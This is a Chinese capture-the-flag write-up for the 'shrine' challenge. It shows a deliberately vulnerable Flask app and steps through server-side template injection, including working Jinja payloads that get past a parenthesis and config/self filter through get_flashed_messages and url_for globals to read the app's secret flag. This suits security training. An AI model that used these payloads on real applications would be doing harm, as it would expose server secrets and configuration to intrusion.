# shrine

## 解题思路：

- 打开网页，看到如下一串代码：

    ```python
    <body>import flask
    import os

    app = flask.Flask(__name__)

    app.config['FLAG'] = os.environ.pop('FLAG')


    @app.route('/')
    def index():
        return open(__file__).read()


    @app.route('/shrine/<path:shrine>')
    def shrine(shrine):

        def safe_jinja(s):
            s = s.replace('(', '').replace(')', '')
            blacklist = ['config', 'self']
            return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

        return flask.render_template_string(safe_jinja(shrine))


    if __name__ == '__main__':
        app.run(debug=True)
    ```

- 注意到里面有 `Flask` , 那基本就是SSTI了，先想到模板注入的第一步：`{{7*7}}`

    读代码，发现这个注入是在 `/shrine/..` 目录下进行的，那么构造url：

        http://111.198.29.45:50688/shrine/%7B%7B7*7%7D%7D

    服务器回应： `49` ，说明注入成功。

    按照[这里的说法](https://www.dazhuanlan.com/2019/12/19/5dfaeb8cf31c7/)，用图里的检验方法一步一步测试具体是哪种注入：

    先使用 `{{7*'7'}}` :

        http://111.198.29.45:50688/shrine/%7B%7B7*'7'%7D%7D

    服务器回应：`7777777` ，说明打印了七遍 `'7'` ，按照说明，可能是jinja+flask，或者twig+flask，再考虑到源码中出现过的 `jinja` ，可以确定是 jinja+flask。

    接下来就构造payload，之前的SSTI注入模板可以直接拿来试试：

    ```python
    {{''.__class__.__mro__[2].__subclasses__()}}
    ```

    我们期待的返回情况应该是超长的一串基类名称，但是服务器回复：

        <built-in method __subclasses__ of type object at 0x7f1209dfbc00>

    我们发现这个 `__subclasses__` 后面的括号根本没有被读进去，那看来就是 `()` 本身被过滤了。

    只好想其他办法，看了大佬的笔记之后学到了 `get_flashed_messages` 函数 ：
    
    - 当代码中有类似 `app.config['FLAG'] = os.environ.pop('FLAG')` 等带config的代码时，可以直接用 `{{config['FLAG']}}` 或者 `{{config.FLAG}}` 得到flag([参考资料](https://www.cnblogs.com/20175211lyz/p/11425368.html)).

    - 如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。

        - 例如：

        ```python
        {{url_for.__globals__['current_app'].config.FLAG}}

        {{get_flashed_messages.__globals__['current_app'].config.FLAG}}

        {{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
        ```

- 构造payload ： `{{get_flashed_messages.__globals__['current_app'].config.FLAG}}` ,成功拿到flag。

## 参考资料：

- [flask模板注入方法详解](https://blog.csdn.net/iamsongyu/article/details/83109772)

- [CTF SSTI(服务器模板注入)](https://www.cnblogs.com/20175211lyz/p/11425368.html)

- [应对各种常见过滤的绕过方法](https://www.cnblogs.com/zaqzzz/p/10263396.html)